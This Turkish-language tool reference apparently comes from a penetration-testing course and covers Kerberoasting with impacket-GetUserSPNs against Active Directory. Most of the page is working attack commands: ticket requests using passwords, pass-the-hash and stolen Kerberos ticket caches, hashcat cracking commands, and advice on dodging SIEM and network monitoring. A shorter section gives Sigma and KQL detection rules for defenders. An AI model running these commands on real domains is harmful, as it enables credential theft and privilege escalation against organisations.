# impacket-GetUserSPNs

> **Kategori:** [6. Kerberos Protokol Cephaneliği](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Active Directory etki alanında `servicePrincipalName` (SPN) özniteliğine sahip kullanıcı (servis) hesaplarını LDAP üzerinden sorgulayan, bu hesaplar için KDC'den Kerberos Hizmet Biletleri (TGS) talep eden ve biletlerin şifrelenmiş kısımlarını çevrimdışı parola kırma araçları (Hashcat / John the Ripper) formatında dışa aktaran Python tabanlı Kerberoasting aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamında SQL Server, IIS, Exchange veya özel kurumsal yazılımlar gibi servisler ağ üzerinden kimlik doğrulaması yapabilmek için bir Service Principal Name (SPN) tanımına ihtiyaç duyar. Bu SPN'ler ya bilgisayar hesaplarına (`Computer$`) ya da insan kontrollü servis hesaplarına (`User Account`) bağlanır. Kerberos mimarisine göre, geçerli bir etki alanı kullanıcısı (en düşük haklara sahip misafir kullanıcı dahi olsa), etki alanındaki herhangi bir SPN için KDC'den (Key Distribution Center / Port 88) bir Hizmet Bileti (`KRB_TGS_REQ` / `KRB_TGS_REP`) talep edebilir.

KDC tarafından üretilen TGS biletinin en kritik bileşeni olan şifreli veri bloğu (`enc-part`), hedef servisin çalıştığı hesabın NTLM karma değeri (veya AES anahtarı) ile şifrelenir. KDC, talep eden kullanıcının bu servise erişim izni olup olmadığını denetlemez; bilet talep etme hakkı protokol gereği etki alanındaki herkese açıktır. **`impacket-GetUserSPNs`**, bu mimari prensibi kullanarak ağdaki tüm SPN sahibi kullanıcı hesaplarını tespit eder, her biri için TGS bileti talep eder ve biletin şifrelenmiş kısmını çekerek saldırganın yerel ortamında Hashcat (Mod 13100 veya 19700) ile kırmasına olanak tanır.

### Mimari Akış Şeması

```
[ Saldırgan / Sızma Testi Uzmanı (Linux / Impacket) ]
       │
       │ (1) LDAP Sorgusu (Port 389 / 636)
       │     Filtre: (&(servicePrincipalName=*)(samAccountType=805306368)...)
       ▼
[ Domain Controller (LDAP Servisi) ]
       │
       │ (2) SPN Sahibi Kullanıcı Hesapları Listesi Döner
       │     (Örn: svc_sql, svc_backup, svc_iis)
       ▼
[ impacket-GetUserSPNs ]
       │
       │ (3) Her Hesap İçin KDC'ye KRB_TGS_REQ İletilir (Port 88)
       ▼
[ KDC (Kerberos Dağıtım Merkezi) ]
       │
       │ (4) KRB_TGS_REP Döner (Bilet hedef kullanıcının NTLM/AES anahtarıyla şifreli)
       ▼
[ impacket-GetUserSPNs ]
       │
       │ (5) Şifreli Bilet Parçası (enc-part) Ayrıştırılır
       ▼
[ Çıktı: $krb5tgs$23$*svc_sql$... (Hashcat Formatı) ]
       │
       ▼
[ Çevrimdışı Kırma: hashcat -m 13100 / 19700 (RockYou / Mask Attack) ]
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Sıfır Ayrıcalıkla Çalışma** | Etki alanında herhangi bir geçerli kullanıcı hesabı (Domain Users) yeterlidir. | İlk erişim (Initial Access) sağlandıktan sonra ilk başvurulan ayrıcalık yükseltme adımıdır. |
| **Pasif ve Aktif Ayrımı** | Sadece SPN'leri listeleme (pasif) veya TGS biletlerini talep etme (`-request`) seçeneği sunar. | Keşif aşamasında gürültü yapmadan hedef servisleri önceden analiz etmeyi sağlar. |
| **Hashcat & John Uyumluluğu** | Çıktıları doğrudan standart Hashcat Mod 13100 (RC4) ve Mod 19700 (AES256) formatında yazar. | Manuel regex veya format dönüştürme zahmetini ortadan kaldırır. |
| **Kerberos Ticket (ccache) Desteği**| Parola girmeden mevcut bir Kerberos bilet önbelleği (`-k -no-pass`) ile çalışabilir. | Parolası bilinmeyen oturumlarda bilet üzerinden doğrudan Kerberoasting yapar. |
| **Hedef Odaklı Saldırı** | Tüm etki alanını taramak yerine sadece tek bir servis hesabını (`-request-user`) hedefleyebilir. | SOC alarmlarını tetiklemeden hedef odaklı operasyon (OPSEC) yürütülmesini sağlar. |

### Karşılaştırma Tablosu

| Kriter | impacket-GetUserSPNs | Rubeus (kerberoast) | PowerView (Invoke-Kerberoast) | Invoker (C#) |
|---|---|---|---|---|
| **Platform** | Linux / Python | Windows (.NET / C#) | Windows (PowerShell) | Windows (C++) |
| **Gereken Konum** | Dış Ağ / Pivot Noktası | İç Ağ (Host Belleği) | İç Ağ (PowerShell) | İç Ağ (Host) |
| **Protokoller** | LDAP + Kerberos (Port 88) | LSA / Kerberos Win32 API | ADSI LDAP + Kerberos | Win32 API |
| **Script Block Log Tespiti**| Etkilenmez (Linux tabanlı) | Etkilenmez (C# ikili) | Yüksek Risk (PowerShell) | Etkilenmez |
| **Tekil Kullanıcı Talebi** | Var (`-request-user`) | Var (`/user:`) | Kısmi | Var |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
impacket-GetUserSPNs <ETKI_ALANI>/<KULLANICI>:<PAROLA> [SEÇENEKLER]
impacket-GetUserSPNs -k -no-pass <ETKI_ALANI>/<KULLANICI> [SEÇENEKLER]
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-request` | Tespit edilen tüm kullanıcı hesapları için TGS biletlerini talep eder ve hash'leri döker. | Bayrak |
| `-request-user <ad>` | Yalnızca belirtilen spesifik kullanıcı hesabı için TGS bileti talep eder (Yüksek OPSEC). | `-request-user svc_sql` |
| `-outputfile <dosya>` | Çıkarılan TGS hash'lerini Hashcat uyumlu metin dosyasına kaydeder. | `-outputfile kerb_hashes.txt`|
| `-dc-ip <ip>` | Etki alanı denetleyicisinin doğrudan IP adresi (DNS çözümlemesi yoksa). | `-dc-ip 192.168.1.10` |
| `-target-domain <ad>` | Farklı bir alt etki alanı (Child Domain) veya güven ilişkisi kurulu etki alanını hedefler. | `-target-domain dev.corp.local`|
| `-hashes [LM:]NTLM` | Parola yerine NTLM karması ile LDAP/Kerberos doğrulaması yapar (Pass-the-Hash). | `-hashes :aad3b435b51...` |
| `-aesKey <hex>` | Parola yerine Kerberos AES-128 veya AES-256 anahtarını kullanır. | `-aesKey e3b0c44298fc1c...` |
| `-k` | Kimlik doğrulama için Kerberos bilet önbelleğini (`KRB5CCNAME`) kullanır. | Bayrak |
| `-no-pass` | Parola sorulmasını engeller (`-k` bayrağı ile birlikte zorunludur). | Bayrak |
| `-include-computer` | Bilgisayar hesaplarını (`Machine$`) da taramaya ve bilet talebine dahil eder. | Bayrak |
| `-use-ldaps` | Düz metin LDAP (port 389) yerine SSL/TLS üzerinden LDAPS (port 636) kullanır. | Bayrak |
| `-ts` | Çıktı satırlarının başına zaman damgası (Timestamp) ekler. | Bayrak |
| `-debug` | Hata ayıklama modunu açar ve ASN.1/Kerberos paket detaylarını ekrana basar. | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Pasif Keşif — Bilet Talep Etmeden SPN Sahibi Hesapları Listeleme

İlk keşif aşamasında KDC'ye hiçbir bilet talebi göndermeden, sadece LDAP sorgusu atarak etki alanındaki servis hesapları, SPN adları ve hesap açıklamaları listelenir. Bu adım sıfır Kerberos logu üretir.

```bash
impacket-GetUserSPNs corp.local/jdoe:'Welcome123!' -dc-ip 192.168.1.10
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName               Name          MemberOf                                            PasswordLastSet             LastLogon
---------------------------------  ------------  --------------------------------------------------  --------------------------  --------------------------
MSSQLSvc/sql01.corp.local:1433     svc_sql       CN=IT Service Accounts,OU=Groups,DC=corp,DC=local   2025-01-15 08:32:11.123456  2026-03-10 11:15:22.987654
HTTP/web.corp.local                svc_web       CN=Domain Admins,CN=Users,DC=corp,DC=local          2024-11-20 14:05:01.000000  2026-04-01 09:44:12.112233
backup/nas.corp.local              svc_backup    CN=Backup Operators,CN=Builtin,DC=corp,DC=local     2023-06-12 10:00:00.000000  2026-02-14 16:20:00.000000
```

> [!IMPORTANT]
> Yukarıdaki tabloda `svc_web` kullanıcısının `Domain Admins` grubuna üye olduğu ve parolasının uzun süredir değişmediği görülmektedir. Bu hesap en yüksek öncelikli saldırı hedefidir!

---

### Senaryo 2: Tekil Servis Hesabını Hedefleyerek TGS İndirme (Yüksek OPSEC)

Tüm hesaplar için toplu bilet talep etmek SIEM alarmlarını tetikleyeceğinden, sadece `svc_web` hesabı hedeflenir ve hash dosyaya yazılır.

```bash
impacket-GetUserSPNs corp.local/jdoe:'Welcome123!' \
  -dc-ip 192.168.1.10 \
  -request-user svc_web \
  -outputfile /tmp/svc_web_hash.txt
```

**Konsol Çıktısı:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting TGS for SPN: HTTP/web.corp.local
[*] Output file written to /tmp/svc_web_hash.txt
```

**Oluşan Hash Formatı (`/tmp/svc_web_hash.txt`):**

```text
$krb5tgs$23$*svc_web$corp.local$HTTP/web.corp.local*$c20f18c6d48259a8c089...
```

---

### Senaryo 3: Parola Bilmeksizin Kerberos Bileti (.ccache) ile Kerberoasting

Daha önce ele geçirilmiş bir TGT bileti (`jdoe.ccache`) kullanılarak şifre girmeden bilet talep edilir.

```bash
# Kerberos bilet ortam değişkenini tanımlayın
export KRB5CCNAME=/tmp/jdoe.ccache

# impacket-GetUserSPNs'i -k ve -no-pass ile çalıştırın
impacket-GetUserSPNs corp.local/jdoe -k -no-pass \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile /tmp/kerb_all.txt
```

---

### Senaryo 4: NTLM Hash İle (Pass-the-Hash) Kerberoasting

Parola bilinmiyor ancak kullanıcının NTLM hash'i mevcutsa:

```bash
impacket-GetUserSPNs corp.local/jdoe -hashes :01fc5a6be7bc6929c40372d23f5052b3 \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile /tmp/hashes.txt
```

---

### Senaryo 5: Elde Edilen Hash'lerin Hashcat ile Kırılması

```bash
# RC4 şifreli TGS biletleri için (Mod 13100):
hashcat -m 13100 -a 0 /tmp/svc_web_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O

# AES256 şifreli TGS biletleri için (Mod 19700):
hashcat -m 19700 -a 0 /tmp/kerb_aes.txt /usr/share/wordlists/rockyou.txt -O
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Kerberos SessionError: KDC_ERR_PREAUTH_FAILED (24)` | Belirtilen parola veya NTLM hash değeri hatalı. | Kullanıcı kimlik bilgilerini doğrulayın veya hesabın kilitlenip kilitlenmediğini kontrol edin. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN (7)` | Belirtilen SPN KDC veritabanında bulunamadı. | `-request-user` parametresinde tam kullanıcı adının (`sAMAccountName`) doğru girildiğini teyit edin. |
| `LDAPSessionError: strongAuthRequired (8)` | Domain Controller düz metin LDAP (port 389) bağlantılarını reddediyor. | Komuta `-use-ldaps` bayrağını ekleyerek port 636 üzerinden bağlanın. |
| `Kerberos SessionError: KRB_AP_ERR_SKEW (37)` | Saldırgan makinesi ile Domain Controller arasındaki sistem saat farkı 5 dakikadan fazla. | `sudo rdate -n <DC_IP>` veya `sudo ntpdate <DC_IP>` komutu ile yerel saatinizi DC ile senkronize edin. |
| `No entries found!` | Etki alanında SPN özniteliği tanımlı kullanıcı hesabı yok (Yalnızca makine hesaplarında var). | `-include-computer` bayrağı ile bilgisayar hesaplarını tarayabilir veya farklı bir etki alanı hedefleyebilirsiniz. |
| `Cannot resolve FQDN / DC unreachable` | Linux sisteminde etki alanı adı DNS üzerinden çözümlenemiyor. | `/etc/hosts` dosyasına `<DC_IP> corp.local <DC_ADI>.corp.local` kaydını ekleyin ve `-dc-ip` parametresini kullanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ORTA (KDC LOGLARI & AĞ TRAFİĞİ)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4769 (Kerberos Service Ticket Request)
[ Kriptografik İz ] : Ticket Encryption Type: 0x17 (RC4-HMAC)
[ Ağ İmzası ]       : LDAP filter (&(servicePrincipalName=*)(samAccountType=805306368))
[ EDR / AV ]        : Host tarafında sıfır iz (Tüm işlem ağ üzerinden KDC ile yapılır)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4769 (Audit Kerberos Service Ticket Operations):**
   - **Gereksiz TGS Talepleri:** Tek bir istemci IP adresinden arka arkaya onlarca farklı SPN için TGS talep edilmesi tipik bir göstergedir.
   - **Şifreleme Türü (Encryption Type):** `Ticket Encryption Type: 0x17` (RC4-HMAC). İstemci AES yerine ısrarla RC4 talep ediyorsa, bu Kerberoasting saldırısının en belirgin imzasıdır.
2. **Directory Service Access Event ID 1644 / Event ID 4662:**
   - SPN özniteliği taşıyan kullanıcıları tespit etmek için çalıştırılan geniş kapsamlı LDAP arama filtreleri kaydedilir.

### 5.2 Ağ ve EDR İmzaları

- **LDAP Filtre İmzası:**
  `(&(servicePrincipalName=*)(samAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))` filtresi Impacket'in varsayılan arama şablonudur ve NIDS (Snort/Suricata) kurallarınca kolaylıkla yakalanabilir.
- **Port 88 Anomalisi:** Kısa sürede KDC'ye gönderilen yüksek hacimli `TGS-REQ` paketleri ağ akış analizörleri tarafından tespit edilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1558.003** | Steal or Forge Kerberos Tickets: Kerberoasting | SPN biletlerini talep edip çevrimdışı parola kırmaya hazırlama. |
| **T1087.002** | Account Discovery: Domain Account | LDAP üzerinden servis hesaplarını ve yetkilerini listeleme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Toplu Bilet Talebi (Mass TGS Requests)** | `-request` ile tüm hesapları çekmeyin. Önce pasif listeleme yapın, ardından yalnızca `Domain Admins` gibi kritik gruplara üye tek bir hesabı `-request-user` ile talep edin. |
| **RC4 Şifreleme Alarmı** | Hedef hesaplar AES destekliyorsa modern ortamlarda RC4 talepleri SIEM kuralını tetikler. Gerektiğinde Kerberoasting'i zaman aralıklarına yayın. |
| **Düz Metin LDAP Sorgusu** | Port 389 trafiği ağ izleme araçlarına takılır; daima `-use-ldaps` bayrağını kullanın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — Tek Kaynaktan Toplu Kerberoasting Tespiti:**

```yaml
title: Potential Kerberoasting Activity via Impacket
status: experimental
description: Detects unusual amount of TGS requests with RC4 encryption within a short timeframe.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
    TicketOptions: '0x40810000'
  filter:
    ServiceName|endswith: '$'
  timeframe: 2m
  condition: selection and not filter | count(ServiceName) by IpAddress > 3
level: high
```

**Microsoft Sentinel (KQL) — Şüpheli SPN Bilet Talepleri:**

```kql
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$" and ServiceName !in ("krbtgt")
| summarize RequestCount = count(), UniqueSPNs = dcount(ServiceName) by IpAddress, TargetUserName, bin(TimeGenerated, 5m)
| where UniqueSPNs >= 3
| project TimeGenerated, IpAddress, TargetUserName, RequestCount, UniqueSPNs
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Bilet İstemeden Sadece SPN Sahibi Hesapları Listeleme (Pasif Keşif)
```bash
impacket-GetUserSPNs corp.local/jdoe:'Password123!' -dc-ip 192.168.1.10
```
- **Ne Yapar?** LDAP üzerinden SPN özniteliği taşıyan tüm kullanıcı hesaplarını, grup üyeliklerini ve son parola değişim tarihlerini listeler; KDC'den hiçbir bilet talep etmez.
- **Ne Zaman Kullanılır?** Saldırı öncesi hedef tespiti ve çevre analizi yaparken sıfır Kerberos logu üretmek için.
- **Parametreler:** `corp.local/jdoe:...`: Etki alanı kimlik bilgisi, `-dc-ip`: Domain Controller IP'si.

### Komut 2: Tüm SPN Biletlerini İsteme ve Hashcat Formatında Kaydetme
```bash
impacket-GetUserSPNs corp.local/jdoe:'Password123!' -dc-ip 192.168.1.10 -request -outputfile /tmp/kerb.txt
```
- **Ne Yapar?** Tespit edilen tüm servis hesapları için TGS biletlerini KDC'den çeker ve kırma işlemine hazır Hashcat formatında dosyaya yazar.
- **Ne Zaman Kullanılır?** İlk erişim sağlandıktan sonra etki alanındaki tüm servis hesaplarının parolalarını çevrimdışı kırmak için.
- **Parametreler:** `-request`: Bilet talep bayrağı, `-outputfile`: Çıktı dosyası yolu.

### Komut 3: Tek Bir Servis Hesabını Hedefleyerek Bilet Çekme (Yüksek OPSEC)
```bash
impacket-GetUserSPNs corp.local/jdoe:'Password123!' -dc-ip 192.168.1.10 -request-user svc_sql -outputfile /tmp/sql.txt
```
- **Ne Yapar?** Yalnızca belirtilen `svc_sql` kullanıcısı için tek bir TGS bileti ister.
- **Ne Zaman Kullanılır?** SIEM ve SOC dedektörlerine toplu bilet anomalisi yakalatmadan kritik bir hesabı hedeflemek için.
- **Parametreler:** `-request-user`: Hedef kullanıcı adı.

### Komut 4: Kerberos Ticket (.ccache) ile Parolasız Kerberoasting
```bash
export KRB5CCNAME=/tmp/admin.ccache
impacket-GetUserSPNs corp.local/jdoe -k -no-pass -dc-ip 192.168.1.10 -request -outputfile /tmp/hashes.txt
```
- **Ne Yapar?** Parola kullanmadan, ortam değişkeninde tanımlı Kerberos bilet önbelleğini kullanarak biletleri çeker.
- **Ne Zaman Kullanılır?** Kullanıcı parolası bilinmediğinde veya bilet hırsızlığı (Pass-the-Ticket) sonrasında.
- **Parametreler:** `-k`: Kerberos doğrulama, `-no-pass`: Parolasız çalışma.

### Komut 5: NTLM Hash İle (Pass-the-Hash) Kerberoasting
```bash
impacket-GetUserSPNs corp.local/jdoe -hashes :01fc5a6be7bc6929c40372d23f5052b3 -dc-ip 192.168.1.10 -request -outputfile /tmp/hashes.txt
```
- **Ne Yapar?** Düz metin parola yerine kurban kullanıcının NTLM karma değerini kullanarak kimlik doğrular ve biletleri toplar.
- **Ne Zaman Kullanılır?** LSASS veya SAM kovanından sadece NTLM hash'i ele geçirildiğinde.
- **Parametreler:** `-hashes`: `[LM:]NTLM` biçiminde karma değer.

### Komut 6: Güvenli LDAPS Bağlantısı ile Ağ Gözetiminden Kaçınma
```bash
impacket-GetUserSPNs corp.local/jdoe:'Password123!' -dc-ip 192.168.1.10 -use-ldaps -request -outputfile /tmp/kerb.txt
```
- **Ne Yapar?** LDAP sorgularını TLS şifreli port 636 üzerinden göndererek ağ içi paket yakalama (Sniffing) ve IPS tespitini engeller.
- **Ne Zaman Kullanılır?** Ağ izleme sensörlerinin bulunduğu ortamlarda veya DC'de LDAP signing zorunlu olduğunda.
- **Parametreler:** `-use-ldaps`: Güvenli LDAPS soketi kullan.

### Komut 7: Farklı Bir Etki Alanına (Child/Trust Domain) Karşı Çalıştırma
```bash
impacket-GetUserSPNs corp.local/jdoe:'Password123!' -dc-ip 192.168.1.10 -target-domain dev.corp.local -request
```
- **Ne Yapar?** Mevcut etki alanı kimlik bilgileriyle güven ilişkisi (Trust) bulunan alt veya harici etki alanındaki SPN'leri sorgular.
- **Ne Zaman Kullanılır?** Etki alanı ormanında yanal hareket ve güven ilişkileri üzerinden sıçrama yaparken.
- **Parametreler:** `-target-domain`: Hedef etki alanı FQDN adı.

### Komut 8: Bilgisayar Hesaplarını da Dahil Ederek Bilet Çekme
```bash
impacket-GetUserSPNs corp.local/jdoe:'Password123!' -dc-ip 192.168.1.10 -include-computer -request
```
- **Ne Yapar?** Normalde filtrelenen makine hesaplarını (`COMPUTER$`) da listeye dahil eder ve TGS biletlerini çeker.
- **Ne Zaman Kullanılır?** Silver Ticket üretmek veya bilgisayar hesabının zayıf/statik parolaya sahip olduğundan şüphelenildiğinde.
- **Parametreler:** `-include-computer`: Bilgisayar hesaplarını dahil etme bayrağı.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket](https://github.com/fortra/impacket)
- **MITRE ATT&CK Referansı:** [T1558.003 - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- **SpecterOps Kerberoasting Araştırması:** [Why Does Kerberoasting Work?](https://posts.specterops.io/)
- **Microsoft Dokümantasyonu:** [Service Principal Names (SPNs)](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names)

---

> **Önceki:** [← Rubeus](./Rubeus.md) · **Sonraki:** [impacket-GetNPUsers →](./impacket-GetNPUsers.md)
